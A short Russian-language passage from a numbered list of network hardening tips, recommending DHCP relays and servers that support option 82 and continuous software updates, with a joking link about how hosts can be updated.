7. Использовать DHCP-ретрансляторы и DHCP-сервера поддерживающие DHCP опцию с кодом [82](http://xgu.ru/wiki/Опция_82_DHCP);

8. Непрерывное обновления программного обеспечения. Обновить хосты можно и [так](https://news.ycombinator.com/item?id=8372040) :)
